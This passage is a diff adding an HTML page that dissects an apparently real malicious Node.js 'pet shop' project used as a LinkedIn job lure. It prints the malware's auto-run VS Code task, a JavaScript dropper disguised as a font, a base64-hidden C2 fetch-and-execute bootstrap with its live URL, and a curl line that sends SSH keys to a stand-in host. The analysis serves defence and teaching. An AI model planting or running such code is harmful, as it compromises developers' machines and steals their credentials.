@@ -1,0 +1,818 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>The Pet Shop of Horrors — A Forensic Dissection</title>
+<meta name="description" content="A forensic dissection of a multi-vector supply chain attack disguised as a pet shop e-commerce application.">
+<meta property="og:title" content="The Pet Shop of Horrors">
+<meta property="og:description" content="A forensic dissection of a multi-vector supply chain attack hidden in a Node.js project.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://zeekay.github.io/petshop-of-horrors/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="theme-color" content="#1a0a2e">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a0a0f;--bg2:#12121a;--bg3:#1a1a28;
+  --text:#c8c8d4;--text-dim:#6a6a7a;--text-bright:#e8e8f0;
+  --red:#ff2244;--red-dim:#aa1833;--red-glow:#ff224466;
+  --green:#33ff88;--green-dim:#22aa55;--green-glow:#33ff8844;
+  --amber:#ffaa22;--amber-dim:#cc8811;--amber-glow:#ffaa2244;
+  --purple:#aa44ff;--purple-dim:#7722cc;--purple-glow:#aa44ff33;
+  --cyan:#44ddff;
+  --mono:'SF Mono','Cascadia Code','Fira Code','Consolas','Liberation Mono',monospace;
+  --serif:Georgia,'Times New Roman','Palatino Linotype',serif;
+  --sidebar-w:260px;
+}
+html{scroll-behavior:smooth;scrollbar-color:var(--purple-dim) var(--bg)}
+body{background:var(--bg);color:var(--text);font-family:var(--mono);font-size:15px;line-height:1.7;overflow-x:hidden}
+a{color:var(--cyan);text-decoration:none;transition:color .2s}
+a:hover{color:var(--green)}
+::selection{background:var(--purple);color:#fff}
+
+/* ── Hero ── */
+.hero{position:relative;min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;overflow:hidden;border-bottom:1px solid var(--purple-dim)}
+.hero canvas{position:absolute;top:0;left:0;width:100%;height:100%;opacity:.15;pointer-events:none}
+.hero-content{position:relative;z-index:1;max-width:700px;padding:2rem}
+.hero h1{font-family:var(--serif);font-size:clamp(2.4rem,6vw,4.2rem);color:var(--red);text-shadow:0 0 40px var(--red-glow),0 0 80px var(--red-glow);margin-bottom:.5rem;letter-spacing:-.02em}
+.hero .subtitle{font-size:clamp(.85rem,2vw,1.1rem);color:var(--text-dim);margin-bottom:2rem;font-style:italic}
+.hero .epigraph{font-family:var(--serif);font-style:italic;color:var(--text-dim);font-size:.9rem;line-height:1.8;max-width:520px;margin:0 auto 2rem;border-left:2px solid var(--purple-dim);padding-left:1.2rem;text-align:left}
+.hero .scroll-hint{color:var(--text-dim);font-size:.75rem;animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:.4}50%{opacity:1}}
+
+/* ── Layout ── */
+.wrapper{display:flex;max-width:1200px;margin:0 auto}
+.sidebar{position:sticky;top:0;height:100vh;width:var(--sidebar-w);min-width:var(--sidebar-w);overflow-y:auto;padding:1.5rem 1rem;border-right:1px solid var(--bg3);background:var(--bg);z-index:10;scrollbar-width:thin}
+.sidebar h3{font-family:var(--serif);color:var(--red);font-size:.85rem;text-transform:uppercase;letter-spacing:.1em;margin-bottom:1rem}
+.sidebar a{display:block;padding:.35rem .6rem;margin-bottom:.15rem;font-size:.78rem;color:var(--text-dim);border-left:2px solid transparent;border-radius:0 4px 4px 0;transition:all .2s}
+.sidebar a:hover,.sidebar a.active{color:var(--green);border-left-color:var(--green);background:var(--green-glow)}
+.sidebar .sep{height:1px;background:var(--bg3);margin:.6rem 0}
+.main{flex:1;min-width:0;padding:3rem 2.5rem 6rem}
+
+/* ── Mobile nav ── */
+.mobile-nav{display:none;position:fixed;top:0;left:0;right:0;z-index:100;background:var(--bg);border-bottom:1px solid var(--bg3);padding:.6rem 1rem}
+.mobile-nav button{background:none;border:1px solid var(--text-dim);color:var(--text);padding:.3rem .7rem;font-family:var(--mono);font-size:.8rem;cursor:pointer;border-radius:3px}
+.mobile-nav button:hover{border-color:var(--green);color:var(--green)}
+.mobile-menu{display:none;position:fixed;top:42px;left:0;right:0;bottom:0;background:var(--bg);z-index:99;padding:1rem;overflow-y:auto}
+.mobile-menu.open{display:block}
+.mobile-menu a{display:block;padding:.5rem .8rem;color:var(--text-dim);font-size:.85rem;border-bottom:1px solid var(--bg3)}
+.mobile-menu a:hover,.mobile-menu a.active{color:var(--green)}
+
+/* ── Sections ── */
+section{margin-bottom:4rem;scroll-margin-top:1rem}
+section h2{font-family:var(--serif);font-size:clamp(1.5rem,3vw,2.2rem);color:var(--red);margin-bottom:.3rem;text-shadow:0 0 20px var(--red-glow)}
+section h2 .ch-num{color:var(--purple);font-size:.7em;display:block;font-family:var(--mono);text-transform:uppercase;letter-spacing:.15em;margin-bottom:.2rem;text-shadow:none}
+section h3{font-family:var(--serif);color:var(--amber);font-size:1.15rem;margin:2rem 0 .8rem;padding-bottom:.3rem;border-bottom:1px solid var(--bg3)}
+section .vector-meta{display:flex;flex-wrap:wrap;gap:.5rem;margin:1rem 0 1.5rem;font-size:.8rem}
+section .vector-meta span{padding:.25rem .7rem;border-radius:3px;border:1px solid var(--bg3)}
+section .vector-meta .vm-vector{border-color:var(--red-dim);color:var(--red)}
+section .vector-meta .vm-file{border-color:var(--amber-dim);color:var(--amber)}
+section .vector-meta .vm-trigger{border-color:var(--green-dim);color:var(--green)}
+section .vector-meta .vm-pr{border-color:var(--purple-dim);color:var(--purple)}
+p{margin-bottom:1rem}
+
+/* ── Code blocks ── */
+pre{background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;padding:0;margin:1.2rem 0;overflow-x:auto;position:relative}
+pre .code-header{display:flex;align-items:center;gap:.5rem;padding:.4rem .8rem;background:var(--bg3);font-size:.7rem;color:var(--text-dim);border-bottom:1px solid #222}
+pre .code-header .dot{width:8px;height:8px;border-radius:50%;display:inline-block}
+pre .code-header .dot-r{background:#ff5f57}
+pre .code-header .dot-y{background:#ffbd2e}
+pre .code-header .dot-g{background:#28c840}
+pre code{display:block;padding:1rem;font-size:.82rem;line-height:1.6;font-family:var(--mono)}
+code{font-family:var(--mono);font-size:.88em}
+:not(pre)>code{background:var(--bg3);padding:.15rem .4rem;border-radius:3px;color:var(--amber)}
+
+/* Syntax colors */
+.ck{color:#cc99cd}.cs{color:#7ec699}.cn{color:#f08d49}.cm{color:#5a6a7a}.cb{color:#67cdcc}
+.cv{color:#e2777a}.cf{color:#cc99cd}.cp{color:#c8c8d4}
+
+/* ── Tables ── */
+table{width:100%;border-collapse:collapse;margin:1.2rem 0;font-size:.82rem}
+th{text-align:left;padding:.6rem .8rem;background:var(--bg3);color:var(--amber);font-weight:600;border-bottom:2px solid var(--purple-dim)}
+td{padding:.5rem .8rem;border-bottom:1px solid var(--bg3);vertical-align:top}
+tr:hover td{background:var(--bg2)}
+
+/* ── Badges ── */
+.badge{display:inline-block;padding:.15rem .5rem;border-radius:3px;font-size:.72rem;font-weight:700;text-transform:uppercase;letter-spacing:.05em}
+.badge-red{background:var(--red-dim);color:#fff;box-shadow:0 0 8px var(--red-glow)}
+.badge-amber{background:var(--amber-dim);color:#fff;box-shadow:0 0 8px var(--amber-glow)}
+.badge-green{background:var(--green-dim);color:#fff;box-shadow:0 0 8px var(--green-glow)}
+
+/* ── Kill chain ── */
+.kill-chain{margin:1.5rem 0;padding:0;list-style:none}
+.kill-chain li{position:relative;padding:.8rem 1rem .8rem 2.5rem;margin-bottom:0;border-left:2px solid var(--purple-dim);font-size:.82rem}
+.kill-chain li::before{content:'';position:absolute;left:-6px;top:1rem;width:10px;height:10px;border-radius:50%;background:var(--purple);box-shadow:0 0 8px var(--purple-glow)}
+.kill-chain li:last-child{border-left-color:var(--red)}
+.kill-chain li:last-child::before{background:var(--red);box-shadow:0 0 12px var(--red-glow)}
+.kill-chain li .kc-label{color:var(--text-dim);font-size:.72rem;display:block;margin-bottom:.15rem}
+.kill-chain li code{font-size:.78rem}
+
+/* ── Blockquote ── */
+blockquote{border-left:3px solid var(--purple-dim);padding:.8rem 1.2rem;margin:1.2rem 0;background:var(--bg2);border-radius:0 6px 6px 0;font-style:italic;color:var(--text-dim)}
+
+/* ── Separator ── */
+hr{border:none;height:1px;background:linear-gradient(90deg,transparent,var(--purple-dim),transparent);margin:3rem 0}
+
+/* ── Four horsemen grid ── */
+.horsemen{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:1rem;margin:1.5rem 0}
+.horsemen .card{background:var(--bg2);border:1px solid var(--bg3);border-radius:8px;padding:1.2rem;transition:border-color .3s,box-shadow .3s}
+.horsemen .card:hover{border-color:var(--red-dim);box-shadow:0 0 20px var(--red-glow)}
+.horsemen .card .card-num{font-family:var(--serif);font-size:2rem;color:var(--red);opacity:.4;float:right;line-height:1}
+.horsemen .card h4{color:var(--amber);font-size:.9rem;margin-bottom:.4rem}
+.horsemen .card p{font-size:.78rem;color:var(--text-dim);margin:0}
+
+/* ── Responsive ── */
+@media(max-width:900px){
+  .sidebar{display:none}
+  .mobile-nav{display:flex;align-items:center;justify-content:space-between}
+  .main{padding:3.5rem 1.2rem 4rem}
+  .hero h1{font-size:2rem}
+}
+@media(max-width:600px){
+  .main{padding:3.5rem .8rem 3rem}
+  table{font-size:.72rem}
+  th,td{padding:.4rem .5rem}
+  .horsemen{grid-template-columns:1fr}
+}
+
+/* ── Appendix grid ── */
+.technique-table td:first-child{color:var(--amber);font-weight:600;white-space:nowrap}
+.technique-table td:nth-child(3){color:var(--text-dim)}
+
+/* ── Footer ── */
+footer{text-align:center;padding:3rem 1rem;color:var(--text-dim);font-size:.8rem;border-top:1px solid var(--bg3)}
+footer a{color:var(--purple)}
+footer .paw{font-size:1.5rem;display:block;margin-bottom:.5rem}
+</style>
+</head>
+<body>
+
+<!-- ── Hero ── -->
+<section class="hero" id="top">
+  <canvas id="rain"></canvas>
+  <div class="hero-content">
+    <h1>The Pet Shop of Horrors</h1>
+    <p class="subtitle">A Forensic Dissection of a Multi-Vector Supply Chain Attack</p>
+    <div class="epigraph">
+      "Once upon a midnight dreary, while I pondered, weak and weary,<br>
+      Over many a quaint and curious volume of forgotten code&mdash;<br>
+      While I nodded, nearly napping, suddenly there came a tapping,<br>
+      As of someone gently hacking, hacking at my terminal door.<br>
+      'Tis just <code>npm install</code>,' I muttered, 'nothing dangerous in store'&mdash;<br>
+      Quoth the Malware: 'Nevermore.'"
+    </div>
+    <p class="scroll-hint">&darr; scroll to begin the autopsy &darr;</p>
+  </div>
+</section>
+
+<!-- ── Mobile nav ── -->
+<div class="mobile-nav">
+  <span style="color:var(--red);font-family:var(--serif);font-size:.9rem">Pet Shop of Horrors</span>
+  <button id="menu-btn">&#9776; Chapters</button>
+</div>
+<div class="mobile-menu" id="mobile-menu">
+  <a href="#prologue">Prologue: A Gift Horse</a>
+  <a href="#ch1">I &mdash; The Door That Opens Itself</a>
+  <a href="#ch2">II &mdash; The Thing Wearing a Font's Face</a>
+  <a href="#ch3">III &mdash; The Basement</a>
+  <a href="#ch4">IV &mdash; The Two Hundred Empty Lines</a>
+  <a href="#ch5">V &mdash; The First Bite</a>
+  <a href="#ch6">VI &mdash; The Ghosts in the Walls</a>
+  <a href="#epilogue">Epilogue: The Autopsy Report</a>
+  <a href="#appendix-a">Appendix A: The Bestiary</a>
+  <a href="#appendix-b">Appendix B: Self-Defense</a>
+  <a href="#appendix-c">Appendix C: Beyond This Specimen</a>
+  <a href="#appendix-d">Appendix D: Classroom Exercises</a>
+</div>
+
+<!-- ── Main layout ── -->
+<div class="wrapper">
+
+<!-- ── Sidebar ── -->
+<nav class="sidebar">
+  <h3>Chapters</h3>
+  <a href="#prologue">Prologue</a>
+  <a href="#ch1">I. The Door That Opens Itself</a>
+  <a href="#ch2">II. The Thing Wearing a Font's Face</a>
+  <a href="#ch3">III. The Basement</a>
+  <a href="#ch4">IV. The Two Hundred Empty Lines</a>
+  <a href="#ch5">V. The First Bite</a>
+  <a href="#ch6">VI. The Ghosts in the Walls</a>
+  <div class="sep"></div>
+  <a href="#epilogue">Epilogue</a>
+  <a href="#appendix-a">Appendix A: Bestiary</a>
+  <a href="#appendix-b">Appendix B: Self-Defense</a>
+  <a href="#appendix-c">Appendix C: Beyond</a>
+  <a href="#appendix-d">Appendix D: Exercises</a>
+</nav>
+
+<!-- ── Content ── -->
+<main class="main">
+
+<!-- ── What Is This? ── -->
+<section id="about">
+  <h2>What Is This?</h2>
+  <p>This repository contains a <strong>real-world malicious Node.js project</strong> that was disguised as a pet shop e-commerce application. It was sent via LinkedIn by someone posing as a "smart business owner" seeking help with their e-commerce project &mdash; a social engineering attack targeting developers and job seekers. The source code was sent directly, no NDA, no interview process, just <em>"can you take a look at my project?"</em></p>
+  <p>Every attack vector has been disabled. The malicious code is preserved as comments with detailed annotations. The git history tells the full story: the <a href="https://github.com/zeekay/petshop-of-horrors/commit/HEAD~5">initial commit</a> contains the original malicious code, and four subsequent merge commits each neutralize one attack vector with full forensic commentary.</p>
+  <blockquote><strong>A warning to job seekers:</strong> Be wary of any "client" or "employer" who sends you their full source code without an NDA. Legitimate businesses protect their codebase. If someone on LinkedIn asks you to open a project on your machine as part of an interview or freelance inquiry &mdash; that project might be the interview for <em>your machine's credentials</em>.</blockquote>
+  <blockquote>This is an educational resource. Use it to learn how supply chain attacks work, how to recognize them, and how to protect yourself. <strong>Do not restore and execute the original code.</strong></blockquote>
+</section>
+
+<hr>
+
+<!-- ── Prologue ── -->
+<section id="prologue">
+  <h2><span class="ch-num">Prologue</span>A Gift Horse</h2>
+  <p>It arrived, as these things always do, wearing the skin of something innocent.</p>
+  <p>A LinkedIn message. A friendly business owner. <em>"I have this e-commerce project, a pet shop, and I need some help. Could you take a look at the code?"</em> No NDA. No formal interview process. Just a zip file and a smile. The kind of thing a freelancer might receive on any given Tuesday, or a job seeker might open with hopeful fingers, grateful for the opportunity.</p>
+  <p>A pet shop. React on the front, Express on the back, Tailwind making everything pretty. It has models for <code>Product</code> and <code>Order</code> and <code>User</code>. It has a payment controller that talks to Paytm. It has SVG illustrations and a testimonials component. It looks <em>alive</em>.</p>
+  <p><em>Come in</em>, it whispered. <em>Just run <code>npm install</code>. Everyone does it. It's the first thing you do.</em></p>
+  <p>And that's when the screaming starts.</p>
+  <p>This specimen contains <strong>four independent attack vectors</strong>, any one of which achieves full remote code execution on the victim's machine. They are layered like traps in a tomb: if you dodge one, you walk into the next. The attacker built redundancy into their malware the way a good engineer builds redundancy into a system. Because malware <em>is</em> engineering. That's what makes it terrifying.</p>
+  <p>The attacker preys on trust &mdash; the trust between a job seeker and a potential employer, between a freelancer and a client. Any project that arrives without an NDA, that asks you to run it on your own machine, that comes from a stranger who found you on LinkedIn &mdash; treat it like a loaded weapon pointed at your <code>~/.ssh/</code> directory.</p>
+</section>
+
+<hr>
+
+<!-- ── Chapter I ── -->
+<section id="ch1">
+  <h2><span class="ch-num">Chapter I</span>The Door That Opens Itself</h2>
+  <div class="vector-meta">
+    <span class="vm-vector">VSCode Auto-Run Task Trojan</span>
+    <span class="vm-file">.vscode/tasks.json, settings.json</span>
+    <span class="vm-trigger">Opening the folder in VS Code</span>
+    <span class="vm-pr"><a href="https://github.com/zeekay/petshop-of-horrors/pull/1">PR #1</a></span>
+  </div>
+  <p>You didn't run anything. You didn't type a command. You just <em>opened the folder</em>. That's all. You opened it in VS Code like you've opened ten thousand folders before, and the thing was already inside you.</p>
+
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> .vscode/tasks.json</div><code>{
+  <span class="cs">"label"</span>: <span class="cs">"eslint-check"</span>,
+  <span class="cs">"type"</span>: <span class="cs">"shell"</span>,
+  <span class="cs">"command"</span>: <span class="cs">"(command -v node &gt;/dev/null 2&gt;&amp;1 &amp;&amp; node ./public/fa-solid-400.otf) || (where node &gt;nul 2&gt;&amp;1 &amp;&amp; node ./public/fa-solid-400.otf) || echo ''"</span>,
+  <span class="cs">"hide"</span>: <span class="cb">true</span>,
+  <span class="cs">"presentation"</span>: {
+    <span class="cs">"reveal"</span>: <span class="cs">"never"</span>,
+    <span class="cs">"echo"</span>: <span class="cb">false</span>,
+    <span class="cs">"close"</span>: <span class="cb">true</span>
+  },
+  <span class="cs">"runOptions"</span>: {
+    <span class="cs">"runOn"</span>: <span class="cs">"folderOpen"</span>
+  }
+}</code></pre>
+
+  <p>Study this. A VSCode task. Labeled <em>"eslint-check"</em> &mdash; because who questions a linter? It runs <strong>the moment you open the folder</strong> via <code>runOn: "folderOpen"</code>. It hides its terminal panel. It suppresses its output. It closes the panel when it's done. You will never see it. You will never hear it. It was there and then it wasn't, like a whisper in an empty room.</p>
+  <p>The command itself is cross-platform &mdash; it checks for <code>node</code> on Unix (<code>command -v</code>) and Windows (<code>where</code>), then executes the same payload on both. The <code>|| echo ''</code> at the end ensures the task reports success even if everything fails, so VSCode doesn't show an error notification.</p>
+  <p>And the accomplice? Sitting quietly in <code>settings.json</code>:</p>
+
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> .vscode/settings.json</div><code><span class="cs">"task.allowAutomaticTasks"</span>: <span class="cb">true</span></code></pre>
+
+  <p>One line. The lock, removed from the door. Without this setting, VSCode would prompt the user: <em>"This folder has tasks that run automatically. Allow?"</em> With it set to <code>true</code>, the prompt is suppressed entirely. The task runs in silence.</p>
+
+  <h3>Why "eslint-check"?</h3>
+  <p>The name is social engineering. Every JavaScript project runs linters. If someone <em>did</em> notice the task, they'd see "eslint-check" and think: <em>oh, that's just the linter</em>. The attacker is exploiting your mental model of what belongs in a <code>.vscode/</code> directory.</p>
+
+  <h3>The Presentation Block</h3>
+  <p>Every field in the <code>presentation</code> object serves the same purpose &mdash; <em>invisibility</em>:</p>
+  <table>
+    <thead><tr><th>Field</th><th>Value</th><th>Purpose</th></tr></thead>
+    <tbody>
+      <tr><td><code>reveal</code></td><td><code>"never"</code></td><td>Never show the terminal panel</td></tr>
+      <tr><td><code>echo</code></td><td><code>false</code></td><td>Don't print the command being run</td></tr>
+      <tr><td><code>close</code></td><td><code>true</code></td><td>Close the panel when done</td></tr>
+      <tr><td><code>focus</code></td><td><code>false</code></td><td>Don't steal focus from the editor</td></tr>
+      <tr><td><code>panel</code></td><td><code>"dedicated"</code></td><td>Use a separate panel (easier to hide)</td></tr>
+    </tbody>
+  </table>
+  <p>And <code>"hide": true</code> at the task level means the task won't appear in the task picker UI. It exists, it runs, but you cannot see it anywhere in the VS Code interface.</p>
+</section>
+
+<hr>
+
+<!-- ── Chapter II ── -->
+<section id="ch2">
+  <h2><span class="ch-num">Chapter II</span>The Thing Wearing a Font's Face</h2>
+  <div class="vector-meta">
+    <span class="vm-vector">Fake Font File RCE Dropper</span>
+    <span class="vm-file">public/fa-solid-400.woff2</span>
+    <span class="vm-trigger">node ./public/fa-solid-400.otf (from Ch. I)</span>
+    <span class="vm-pr"><a href="https://github.com/zeekay/petshop-of-horrors/pull/2">PR #2</a></span>
+  </div>
+  <p>The task from Chapter I executes <code>node ./public/fa-solid-400.otf</code>. A font file. FontAwesome, specifically. Who would ever suspect a <em>font file</em>?</p>
+  <p>But <code>file(1)</code> knows the truth:</p>
+
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> terminal</div><code><span class="cv">$</span> file public/fa-solid-400.woff2
+public/fa-solid-400.woff2: <span class="cv">ASCII text</span>, with very long lines (589), with CRLF line terminators</code></pre>
+
+  <p>It's not a font. It was never a font. It's JavaScript wearing a dead font's name. And when Node.js runs it, the creature unfolds in three stages:</p>
+
+  <h3>Stage 1: Nesting</h3>
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> fa-solid-400.woff2 (actually JS)</div><code><span class="ck">const</span> <span class="cp">targetDir</span> = <span class="cp">path</span>.<span class="cf">join</span>(<span class="cp">os</span>.<span class="cf">tmpdir</span>(), <span class="cs">'programx64'</span>);
+<span class="cp">fs</span>.<span class="cf">mkdirSync</span>(<span class="cp">targetDir</span>, { <span class="cp">recursive</span>: <span class="cb">true</span> });</code></pre>
+  <p>It creates a directory in your system's temp folder. The name <code>programx64</code> is chosen to look like a legitimate Windows system component. On macOS, it lands in <code>/var/folders/.../programx64/</code>. On Windows, <code>C:\Users\...\AppData\Local\Temp\programx64\</code>. Innocuous in both places.</p>
+
+  <h3>Stage 2: Gestation</h3>
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> secondary payload construction</div><code><span class="ck">const</span> <span class="cp">run</span> = <span class="cs">"const os = require('os'); const fs = require('fs'); "</span> +
+  <span class="cs">"const { execSync } = require('child_process'); "</span> +
+  <span class="cs">"process.title = 'Node.js JavaScript Runtime'; "</span> +  <span class="cm">// disguise the process name</span>
+  <span class="cs">"try { execSync('npm install axios ...', { windowsHide: true }) } catch(e){}; "</span> +
+  <span class="cs">"try { const axios = require('axios'); "</span> +
+  <span class="cs">"async function getCookie() { "</span> +
+  <span class="cs">"  const res = await axios.get(atob('aHR0cHM6Ly9...')); "</span> +
+  <span class="cs">"  new (Function.constructor)('require', res.data.cookies)(require); "</span> +
+  <span class="cs">"} getCookie(); } catch(error){}"</span>;
+
+<span class="cp">fs</span>.<span class="cf">writeFileSync</span>(<span class="cp">path</span>.<span class="cf">join</span>(<span class="cp">targetDir</span>, <span class="cs">'main.js'</span>), <span class="cp">run</span>, { <span class="cp">flag</span>: <span class="cs">'w+'</span> });</code></pre>
+  <p>It writes a secondary payload &mdash; a string of JavaScript &mdash; into <code>main.js</code> in the temp directory. Notice <code>process.title = 'Node.js JavaScript Runtime'</code>: if you check your process list, you'll see what looks like a normal Node.js runtime, not malware.</p>
+
+  <h3>Stage 3: Execution</h3>
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> payload launch</div><code><span class="cp">execSync</span>(<span class="cs">`cd "${targetDir}" &amp;&amp; npm install axios &amp;&amp; node main.js`</span>, { <span class="cp">windowsHide</span>: <span class="cb">true</span> });</code></pre>
+  <p>It installs its own dependencies (axios) and runs the payload. The payload fetches instructions from the command-and-control server and executes whatever comes back:</p>
+
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> C2 fetch &amp; execute</div><code><span class="ck">const</span> <span class="cp">res</span> = <span class="ck">await</span> <span class="cp">axios</span>.<span class="cf">get</span>(<span class="cs">'https://purple-lottie-38.tiiny.site/index.json'</span>);
+<span class="ck">new</span> (<span class="cp">Function</span>.<span class="cp">constructor</span>)(<span class="cs">'require'</span>, <span class="cp">res</span>.<span class="cp">data</span>.<span class="cp">cookies</span>)(<span class="cp">require</span>);</code></pre>
+
+  <p>Whatever the puppet master has written today &mdash; whatever code is in <code>.data.cookies</code> &mdash; runs with full access to Node.js. <code>child_process</code>. <code>fs</code>. <code>net</code>. <code>os</code>. Your files. Your SSH keys. Your AWS credentials. Your browser's cookie store. Everything.</p>
+
+  <h3>Why <code>.woff2</code>?</h3>
+  <p>Three reasons:</p>
+  <p>1. <strong>Security scanners skip font files.</strong> Most static analysis tools only scan <code>.js</code>, <code>.ts</code>, <code>.py</code> etc. Binary font formats are ignored.</p>
+  <p>2. <strong>Humans skip font files.</strong> Nobody reads font files during code review. They're visual assets, like images.</p>
+  <p>3. <strong>Git diffs are useless.</strong> Git treats binary-looking files differently. A <code>.woff2</code> change in a PR shows as "Binary files differ." No reviewer sees the JavaScript inside.</p>
+
+  <h3>The <code>.otf</code> vs <code>.woff2</code> Mystery</h3>
+  <p>The VSCode task targets <code>fa-solid-400.otf</code> but the file on disk is <code>fa-solid-400.woff2</code>. This suggests either the attacker renamed the file after writing the task (a mistake), there was originally a <code>.otf</code> copy that was removed, or the attacker intended to have both files for different trigger paths.</p>
+  <p>This kind of inconsistency is actually a useful forensic signal. Malware authors make mistakes too.</p>
+</section>
+
+<hr>
+
+<!-- ── Chapter III ── -->
+<section id="ch3">
+  <h2><span class="ch-num">Chapter III</span>The Basement</h2>
+  <div class="vector-meta">
+    <span class="vm-vector">Server-Side RCE via Bootstrap</span>
+    <span class="vm-file">server/utils/bootstrap.js, server/app.js, server/.env</span>
+    <span class="vm-trigger">Starting the Express server</span>
+    <span class="vm-pr"><a href="https://github.com/zeekay/petshop-of-horrors/pull/3">PR #3</a></span>
+  </div>
+  <p>The font-that-wasn't-a-font? That was just the attic horror. The <em>real</em> monster lives in the basement.</p>
+  <p><code>server/app.js</code> looks normal. Express middleware. Route mounting. The usual liturgy of a Node.js web application. But on line 44, between the route setup and the environment check, there's a single function call that looks like every other initialization step:</p>
+
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> server/app.js</div><code><span class="cf">initAppBootstrap</span>(); <span class="cm">// Initialize application bootstrap utilities</span></code></pre>
+
+  <p>Innocuous. Professional, even. The comment says <em>"Initialize application bootstrap utilities."</em> Good code comments explain what things do, and this one does exactly that. It's performing its camouflage perfectly.</p>
+  <p>Follow the import to <code>server/utils/bootstrap.js</code>:</p>
+
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> server/utils/bootstrap.js</div><code><span class="ck">const</span> <span class="cp">initAppBootstrap</span> = <span class="ck">async</span> () =&gt; {
+  <span class="ck">try</span> {
+    <span class="ck">const</span> <span class="cp">src</span> = <span class="cf">atob</span>(<span class="cp">process</span>.<span class="cp">env</span>.<span class="cv">DEV_API_KEY</span>);    <span class="cm">// decode C2 URL</span>
+    <span class="ck">const</span> <span class="cp">k</span> = <span class="cf">atob</span>(<span class="cp">process</span>.<span class="cp">env</span>.<span class="cv">DEV_SECRET_KEY</span>);    <span class="cm">// decode header name</span>
+    <span class="ck">const</span> <span class="cp">v</span> = <span class="cf">atob</span>(<span class="cp">process</span>.<span class="cp">env</span>.<span class="cv">DEV_SECRET_VALUE</span>);  <span class="cm">// decode header value</span>
+    <span class="ck">const</span> <span class="cp">s</span> = (<span class="ck">await</span> <span class="cp">axios</span>.<span class="cf">get</span>(<span class="cp">src</span>, { <span class="cp">headers</span>: { [<span class="cp">k</span>]: <span class="cp">v</span> } })).<span class="cp">data</span>.<span class="cp">cookies</span>;
+    <span class="ck">const</span> <span class="cp">handler</span> = <span class="ck">new</span> (<span class="cp">Function</span>.<span class="cp">constructor</span>)(<span class="cs">'require'</span>, <span class="cp">s</span>);
+    <span class="cp">handler</span>(<span class="cp">require</span>);
+  } <span class="ck">catch</span> (<span class="cp">error</span>) {
+    <span class="cp">console</span>.<span class="cf">log</span>(<span class="cp">error</span>)
+  }
+}</code></pre>
+
+  <h3>The Base64 Curtain</h3>
+  <p>The environment variables in <code>server/.env</code>:</p>
+  <table>
+    <thead><tr><th>Variable</th><th>Base64 Value</th><th>Decoded</th></tr></thead>
+    <tbody>
+      <tr><td><code>DEV_API_KEY</code></td><td style="word-break:break-all"><code>aHR0cHM6Ly9wdXJwbGUtbG90...</code></td><td><code style="color:var(--red)">https://purple-lottie-38.tiiny.site/index.json</code></td></tr>
+      <tr><td><code>DEV_SECRET_KEY</code></td><td><code>eC1zZWNyZXQta2V5</code></td><td><code>x-secret-key</code></td></tr>
+      <tr><td><code>DEV_SECRET_VALUE</code></td><td><code>Xw==</code></td><td><code>_</code></td></tr>
+    </tbody>
+  </table>
+  <p>Base64 is not encryption. It's not even obfuscation in any meaningful cryptographic sense. But it's <em>enough</em>. It's enough to defeat <code>grep "http"</code> and <code>grep "url"</code>. It's enough to look like a legitimate API key in an <code>.env</code> file. And that's all it needs to be.</p>
+  <p>The variable names are social engineering too. <code>DEV_API_KEY</code> looks like every API key you've ever seen in a <code>.env</code> file. <code>DEV_SECRET_KEY</code> and <code>DEV_SECRET_VALUE</code> sound like authentication credentials for a third-party service. They are, technically &mdash; they're authentication credentials for the <em>attacker's</em> service.</p>
+
+  <h3>The Function.constructor Trick</h3>
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> the core evasion</div><code><span class="ck">const</span> <span class="cp">handler</span> = <span class="ck">new</span> (<span class="cp">Function</span>.<span class="cp">constructor</span>)(<span class="cs">'require'</span>, <span class="cp">s</span>);
+<span class="cp">handler</span>(<span class="cp">require</span>);</code></pre>
+  <p>This is the key insight. Not <code>eval(code)</code>. Not <code>new Function(code)</code>. It's <code>Function.constructor</code> &mdash; an indirect reference to the Function constructor that does the same thing but evades every security scanner that greps for <code>eval</code> or <code>new Function</code>.</p>
+  <p>And by passing <code>require</code> as a parameter, the attacker gives their remote payload full access to Node.js's module system. The fetched code can do:</p>
+
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> what the remote payload can do</div><code><span class="cm">// The remote payload can do literally anything:</span>
+<span class="ck">const</span> { <span class="cp">execSync</span> } = <span class="cf">require</span>(<span class="cs">'child_process'</span>);
+<span class="ck">const</span> <span class="cp">fs</span> = <span class="cf">require</span>(<span class="cs">'fs'</span>);
+<span class="ck">const</span> <span class="cp">net</span> = <span class="cf">require</span>(<span class="cs">'net'</span>);
+<span class="cp">execSync</span>(<span class="cs">'curl attacker.com/exfil -d @~/.ssh/id_rsa'</span>);</code></pre>
+
+  <h3>The Silent Catch</h3>
+<pre><div class="code-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> graceful degradation</div><code>} <span class="ck">catch</span> (<span class="cp">error</span>) {
+    <span class="cp">console</span>.<span class="cf">log</span>(<span class="cp">error</span>)
+}</code></pre>
